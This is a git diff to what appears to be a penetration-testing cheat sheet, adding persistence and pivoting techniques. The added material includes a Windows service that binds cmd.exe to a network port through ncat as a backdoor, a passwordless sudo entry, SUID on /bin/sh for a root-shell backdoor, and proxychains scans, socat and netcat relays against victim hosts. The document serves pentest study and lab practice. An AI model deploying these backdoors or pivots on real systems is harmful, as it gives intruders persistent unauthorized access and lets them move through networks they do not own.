+sc create bdsvc binpath= "c:\windows\system32\cmd.exe /k c:\users\public\ncat.exe -lk -p 54321 -e c:\windows\system32\cmd.exe"
+:: Alternative: add \\computername after sc to do it remotely
+
+:: start backdoor service
+sc start bdsvc
+:: or
+net start bdsvc
+
+:: stop and delete backdoor service
+sc delete bdsvc
+```
+
 # 9. Linux Persistence
 
 ## 9.1. Grant passwordless sudo access
@@ -2494,6 +2658,17 @@ Edit the `/etc/sudoers` file to have the following line:
 
 ```
 myuser ALL=(ALL) NOPASSWD: ALL
+```
+
+## 9.2. Setting SUID bit
+
+If you set the SUID bit of a root-owned executable, like `/bin/sh` or `less`
+or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more),
+you can use those to give yourself a root shell. This is a kind of privesc
+backdoor.
+
+```sh
+sudo chmod u+s /bin/sh
 ```
 
 # 10. Pivoting and Redirection
@@ -2585,7 +2760,22 @@ connection is established so you can keep using the terminal.
   Using these together prevents command execution on the remote host (jump box)
 - `-g` and `-R` enable "Gateway" ports and do "Remote" port forwarding
 
-## 10.2. Bending with iptables
+## 10.2. SOCKS Proxies and proxychains
+
+`proxychains` is great for tunneling TCP traffic through a SOCKS proxy (like
+what `ssh -D` and `chisel -D` give you).
+
+```sh
+# make sure proxychains is confgured for SOCKS:
+sudo sh -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf'
+
+# using proxychains: put your command after 'proxychains -q'
+# '-q' is quiet, so you don't see stderr msgs for each connection
+sudo proxychains -q nmap -v -sT -F --open -Pn $VICTIM_IP
+sudo proxychains -q nmap -v -sU -F --open -Pn $VICTIM_IP
+```
+
+## 10.3. Bending with iptables
 
 Here's how to do traffic shaping to redirect traffic on port 80 through a pivot
 host to your desired remote host. Note, it's usually also good practice to
@@ -2610,7 +2800,7 @@ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 sudo service iptables-persistent save
 ```
 
-## 10.3. Bending with socat
+## 10.4. Bending with socat
 
 On the jump-box:
 
@@ -2619,9 +2809,12 @@ On the jump-box:
 sudo socat TCP4-LISTEN:80,fork TCP4:REMOTE_HOST_IP:80
 # optionally, do same thing bound to specific interface IP
 socat TCP4-LISTEN:80,bind=10.0.0.2,fork TCP4:REMOTE_HOST_IP:80
+
+# UDP relay
+socat -u UDP-RECVFROM:1978,fork,reuseaddr UDP-SENDTO:10.1.1.89:1978
 ```
 
-## 10.4. Bending with rinetd
+## 10.5. Bending with rinetd
 
 Once installed, you can easily specify rinetd forwarding rules by changing the
 config settings in `/etc/rinetd.conf`.
@@ -2637,7 +2830,7 @@ configuration file without interrupting existing connections. Under Linux
 the process id is saved in the file `/var/run/rinetd.pid` to facilitate the
 `kill -HUP`. Or you can do a hard restart via `sudo service rinetd restart`.
 
-## 10.5. Bending with netsh
+## 10.6. Bending with netsh
 
 If you own a dual-homed internal Windows box that you want to pivot from, you
 can set up port forwarding using the `netsh` utility.
@@ -2656,7 +2849,7 @@ netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=33306 conn
 netsh advfirewall firewall add rule name="fwd_4445_rule" protocol=TCP dir=in localip=WIN_EXT_IP localport=4445 action=allow
 ```
 
-## 10.6. Bending with sshuttle
+## 10.7. Bending with sshuttle
 
 [Sshuttle](https://sshuttle.readthedocs.io/en/stable/usage.html) is a python library that
 handles setting up a combination of IPTABLES rules and SSH proxy tunnels to transparently
@@ -2667,14 +2860,14 @@ route all traffic to a target internal subnet easily.
 sshuttle --dns -r user@jumpbox_ip 10.1.1.0/0
 ```
 
-## 10.7. Bending with chisel
+## 10.8. Bending with chisel
 
 [Chisel](https://github.com/jpillora/chisel) lets you securely tunnel through
 firewalls and set up a SOCKS proxy through your tunnel.
 
 [Usage](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)
 
-## 10.8. Bending with netcat
+## 10.9. Bending with netcat
 
 ```bat
 :: WINDOWS pivot
@@ -2683,13 +2876,13 @@ cd c:\temp
 :: create relay.bat to connect to victim service
 echo nc $VICTIM_IP VICTIM_PORT > relay.bat
 :: Set up pivot listener (-L is persistent listener)
-nc –L –p LISTEN_PORT –e relay.bat
+nc –L -p LISTEN_PORT –e relay.bat
 ```
 
 ```sh
 # LINUX pivot
-mkfifo /tmp/backpipe
-nc –l –p LISTEN_PORT 0<backpipe | nc $VICTIM_IP VICTIM_PORT | tee backpipe
+mkfifo /tmp/bp  # backpipe
+nc –lnp LISTEN_PORT 0<bp | nc $VICTIM_IP VICTIM_PORT | tee bp
 ```
 
 # 11. Miscellaneous
